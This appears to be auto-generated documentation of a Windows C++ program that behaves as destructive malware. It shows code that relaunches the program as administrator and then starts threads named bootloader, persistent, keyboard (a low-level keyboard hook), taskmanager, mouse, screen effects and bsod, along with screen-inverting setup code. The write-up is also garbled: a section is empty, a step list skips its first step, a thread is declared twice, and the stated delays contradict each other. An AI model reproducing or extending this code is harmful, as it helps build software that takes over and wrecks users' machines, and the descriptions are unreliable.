# code_snippet
## Summary
The code snippet is a function called `keyboard()` that sets up a low-level keyboard hook using the `SetWindowsHookEx` function. It then waits for 1 millisecond before allowing keyboard interaction by setting the `permitirInteraccion` flag to true.

## Example Usage
```cpp
keyboard();
```

## Code Analysis
### Inputs
- None
___
### Flow

2. It checks if the hook was successfully set up and prints an error message if not.
3. It prints a message indicating that keyboard interaction will be allowed after a 10-second delay.
4. It waits for 1 millisecond to allow the message loop to start.
5. It sets the `permitirInteraccion` flag to true, allowing keyboard interaction.
6. It prints a message indicating that keyboard interaction is now allowed.
7. It enters a message loop using `GetMessage`, `TranslateMessage`, and `DispatchMessage` to handle keyboard messages.
8. It unregisters the hook using `UnhookWindowsHookEx` before exiting the function.

# code_snippet
## Summary
The code snippet checks if the program is running with administrator privileges and if not, it relaunches itself with administrator privileges. It then creates multiple threads to execute different functions concurrently.

## Example Usage
```cpp
// Check if running as admin
if (!IsRunAsAdmin()) {
    // Relaunch with admin privileges
    WCHAR path[MAX_PATH];
    GetModuleFileNameW(NULL, path, MAX_PATH);
    ShellExecuteW(NULL, L"runas", path, NULL, NULL, SW_SHOWNORMAL);
    return 0;
}

// Create threads to execute functions concurrently
std::thread t1(wallpaper);
std::thread t2(bootloader);
std::thread t3(screen);
std::thread t4(backgroundcmd);
std::thread t5(persistent);
std::thread t6(keyboard);
std::thread t7(taskmanager);
std::thread t8(mouse);
std::thread t3(screen);
std::this_thread::sleep_for(std::chrono::seconds(15));
std::thread t10(bsod);

// Join threads to wait for their completion
t1.join();
t2.join();
t3.join();
t4.join();
t5.join();
t6.join();
t10.join();

// Return success
return EXIT_SUCCESS;
```

## Code Analysis
### Inputs
- None
___
### Flow
1. The code checks if the program is running with administrator privileges using the `IsRunAsAdmin()` function.
2. If the program is not running as admin, it retrieves the path of the executable and relaunches the program with administrator privileges using `ShellExecuteW()`.
3. If the program is running as admin, it creates multiple threads to execute different functions concurrently.
4. The functions executed by the threads include `wallpaper()`, `bootloader()`, `screen()`, `backgroundcmd()`, `persistent()`, `keyboard()`, `taskmanager()`, `mouse()`, and `bsod()`.
5. The main thread waits for 15 seconds using `std::this_thread::sleep_for()` to allow the other threads to execute.
6. The main thread then joins the other threads using `join()` to wait for their completion.
7. The program returns `EXIT_SUCCESS` to indicate successful execution.
___
### Outputs
- The program is relaunched with administrator privileges if it is not already running as admin.
- Multiple functions are executed concurrently using separate threads.
- The program waits for 15 seconds before joining the threads and returning success.
___




# code_snippet

# code_snippet
## Summary
The code snippet is a part of the larger code and consists of two functions: `circle` and `originalCode`. The `circle` function continuously stretches and copies a portion of the screen to create a circular effect. The `originalCode` function continuously inverts the colors of the entire screen. These functions are called in the `screen` function, which initializes the screen dimensions, creates two threads to run the `circle` and `originalCode` functions, and handles the message loop.

## Example Usage
```cpp
// Set up the screen dimensions
screenWidth = GetSystemMetrics(SM_CXSCREEN);
screenHeight = GetSystemMetrics(SM_CYSCREEN);

// Create threads to run the circle and originalCode functions
HANDLE hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)circle, NULL, 0, NULL);
HANDLE hThread2 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)originalCode, NULL, 0, NULL);

// Check if thread creation was successful
if (hThread1 == NULL || hThread2 == NULL) {
    MessageBoxW(NULL, L"Failed to create thread", L"Error", MB_ICONERROR);
}

// Enter the message loop
MSG msg;
while (GetMessage(&msg, NULL, 0, 0)) {
    TranslateMessage(&msg);
    DispatchMessage(&msg);
}
```

## Code Analysis
### Inputs
- None
___
### Flow
1. The `screen` function initializes the `screenWidth` and `screenHeight` variables with the system screen dimensions.
2. Two threads are created using the `CreateThread` function. One thread runs the `circle` function and the other runs the `originalCode` function.
3. If either thread creation fails, an error message is displayed using the `MessageBoxW` function.
4. The `screen` function enters a message loop using the `GetMessage`, `TranslateMessage`, and `DispatchMessage` functions.
___
### Outputs
- None
___
